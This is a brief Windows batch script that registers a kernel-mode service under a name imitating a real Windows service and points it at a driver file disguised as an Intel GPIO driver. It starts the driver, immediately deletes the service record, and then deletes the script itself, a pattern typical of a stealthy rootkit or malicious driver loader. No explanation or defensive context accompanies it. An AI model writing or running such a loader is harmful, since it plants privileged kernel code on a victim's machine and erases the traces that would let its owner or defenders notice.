@echo off
cd %~dp0
sc create WpnUserService78 binpath=C:\Windows\System32\iaLPSS0i_GPIO_CNL.sys type=kernel
sc start WpnUserService78
sc delete WpnUserService78
del "%~f0"



